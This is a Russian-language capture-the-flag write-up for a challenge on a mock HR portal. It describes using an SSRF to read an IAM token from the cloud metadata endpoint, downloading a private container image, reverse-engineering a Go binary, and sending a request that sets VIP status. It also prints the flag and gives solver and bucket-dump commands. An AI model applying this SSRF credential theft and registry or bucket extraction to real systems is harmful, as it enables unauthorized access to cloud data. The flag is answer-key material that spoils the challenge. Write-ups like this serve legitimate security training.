# МёдХантер: золотая звезда

**Флаг:** `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`

SSRF из [первой части](../medhunter_invite/medhunter_invite_writeup.md) раскрывает
IAM-токен сервисной учётной записи. Он даёт доступ к приватному Container Registry,
откуда можно скачать backend и найти условие выдачи золотой звезды.

## Получение образа

Импорт резюме запрашивает:

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/default
```

IAM-токен обменивается на токен Registry. Затем через API v2 загружаются манифест
`hrportal-backend:latest` и перечисленные в нём слои. При сборке файловой системы
нужно учитывать whiteout-записи: простая распаковка всех tar подряд может вернуть
файлы, удалённые следующим слоем.

## Условие VIP

В образе находится `/app/hrportal-api` — Go-бинарник без обычных символов.
Таблица `.gopclntab` сохраняет имена и границы функций, включая
`(*SeekerService).SaveResume`.

В этой функции проверяется наличие строки флага в `experience`. При совпадении
сервер ставит `is_vip=true` и удаляет строку перед сохранением резюме:

```http
PUT /api/seeker/resume
Content-Type: application/json

{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED} ..."}
```

Ответ содержит `is_vip: true`, а сохранённое поле уже не содержит флаг.

## Запуск

Нужны cookie соискателя и доступ к Registry. Вместо SSRF можно передать свежий
`--iam-token`:

```bash
uv run python medhunter_vip/solve_medhunter_vip.py \
  --registry-id crpml40t8ia2kptf4iv7 --cookie-file cookies.txt --apply-vip
uv run python medhunter_vip/solve_medhunter_vip.py --self-test
```

Если обновление резюме требует CAPTCHA, передайте `--recaptcha-token`.
Самотест проверяет разбор IAM-токена и cookie, пути и распаковку одного слоя OCI. Образ и
`medhunter_vip/rootfs-rebuilt/` создаются при запуске и не включены в Git.

[solve_medhunter_vip.py](solve_medhunter_vip.py) выполняет всю цепочку. В бинарнике
также находятся ключ `mhq_v1_<32 hex>` и префикс очереди `incoming/`, используемые в
[третьей части](../medhunter_signature/medhunter_signature_writeup.md).
Для просмотра объектов общего бакета есть [s3.py](../medhunter_signature/s3.py):

```bash
uv run python medhunter_signature/s3.py dump medhunter-resumes-6d6c314a
```

Клиент принимает `STORAGE_ACCESS_KEY` и `STORAGE_SECRET_KEY` из окружения.
